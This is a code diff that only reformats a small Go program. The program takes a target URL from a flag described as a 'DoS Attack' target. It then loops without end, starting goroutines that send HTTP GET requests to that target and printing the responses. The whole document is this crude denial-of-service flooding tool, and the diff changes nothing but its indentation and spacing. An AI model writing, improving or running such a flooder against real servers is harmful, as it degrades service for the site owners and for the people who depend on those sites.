@@ -10,22 +10,22 @@ import (
 var target = flag.String("target", "", "target to run DoS Attack on")
 
 func main() {
-  resChannel := make(chan interface{})
-  flag.Parse()
-  // checking for value in required flags
+	resChannel := make(chan interface{})
+	flag.Parse()
+	// checking for value in required flags
 	if *target == "" {
 		flag.PrintDefaults()
 		os.Exit(1)
 	}
 	fmt.Println(*target)
-	for{
+	for {
 		go func() {
 			resp, err := http.Get(*target)
 			if err != nil {
 				panic(err)
 			}
 			resChannel <- resp
-	}()
-	fmt.Println(<-resChannel)
+		}()
+		fmt.Println(<-resChannel)
 	}
 }
